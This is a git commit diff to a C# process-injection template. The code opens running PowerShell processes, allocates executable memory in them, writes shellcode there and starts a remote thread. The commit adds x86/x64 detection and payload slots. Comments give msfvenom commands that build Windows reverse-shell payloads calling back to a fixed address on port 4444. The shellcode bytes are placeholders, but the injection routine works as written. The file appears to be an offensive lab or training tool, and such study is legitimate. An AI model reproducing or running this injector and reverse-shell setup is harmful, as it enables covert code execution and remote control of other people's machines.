8519ad35eb78ba46f65b4000e53cc2709bd0b00e
Tasos Chatz <element0002002@gmail.com>
2021-08-03 13:48:24 +0200

    Add x86 and x64 payloads. Supports x86 and x64 architectures.

--- Process_Injection_template_(basic)/Program.cs
+++ Process_Injection_template_(basic)/Program.cs
@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.ComponentModel;
 
 
 namespace Inject
@@ -16,53 +17,84 @@ namespace Inject
         static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
+        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
+        public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);
 
         static void Main(string[] args)
         {
+            byte[] buf;
             IntPtr hProcess = default;
             Process[] powershellPid = Process.GetProcessesByName("powershell");
             int processID = 0;
+            bool processArch = false;
             foreach (Process process in powershellPid)
             {
                 //Open remote process
                 processID = process.Id;
                 hProcess = OpenProcess(0x001F0FFF, false, process.Id);
+                IsWow64Process(hProcess,out processArch);
             }
-           
+
             //Allocate space
             IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
             
-            string allocAddress = string.Format("{0:X}", addr); // Pointer -> String
-            int number = int.Parse(allocAddress); // String -> Int
+            var allocAddress = string.Format("{0:X}", addr); // Pointer -> String
+            UInt64 number = UInt64.Parse(allocAddress); // String -> Int
             string allocAddressHex = number.ToString("x"); // Int -> Hex
             Console.WriteLine("Executable Memory Address (VirtualAllocEx) to remote processID-> "+processID+" on Mem.Address ->" + "0x"+allocAddressHex);
             
 
             // x86 Payload: msfvenom -p windows/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
-            byte[] buf = new byte[<BYTES>] { <SHELLCODE> };
+            byte[] bufx86 = new byte[<BYTES>] 
+            {
 
+                <SHELLCODE_X86>   
+
+            };
+
+            // x64 Payload: msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
+            byte[] bufx64 = new byte[<BYTES>]
+            {
+                <SHELLCODE_X64>
+            };
+
+            if (processArch == true)
+            {
+                //Injected process is x86
+                buf = bufx86;
+                Console.WriteLine("Shellcode injected to x86 process.");
+            }
+            else
+            {
+                //Injected process is x64
+                buf = bufx64;
+                Console.WriteLine("Shellcode injected to x64 process.");
+
+            }
             unsafe
             {
                 fixed (byte* p = &buf[0])
                 {
-                    byte* p2 = p;                    
+                    byte* p2 = p;
                     
                     //Convert DEC->HEX
-                    string bufString = string.Format("{0:X}", new IntPtr(p2)); //Pointer -> String (DEC) format.
-                    int bufInt = int.Parse(bufString); //String -> Integer
+                    var bufString = string.Format("{0:X}", new IntPtr(p2)); //Pointer -> String (DEC) format.
+                    UInt64 bufInt = UInt64.Parse(bufString); //String -> Integer
                     string bufHex = bufInt.ToString("x"); //Integer -> Hex
 
                     Console.WriteLine("Payload Address on this executable: "+"0x"+bufHex);
 
                 }
             }
+            Console.WriteLine("\n");
+            Console.WriteLine("1st breakpoint. Press Enter to continue ...");
             Console.ReadLine();
             IntPtr outSize;
             
             //Write to remote process
             WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
             Console.WriteLine("Payload has been written to the buffer!");
+            Console.WriteLine("2st breakpoint. Press Enter to continue ...");
             Console.ReadLine();
 
             //Enumerate the threads of the remote process before creating a new one.
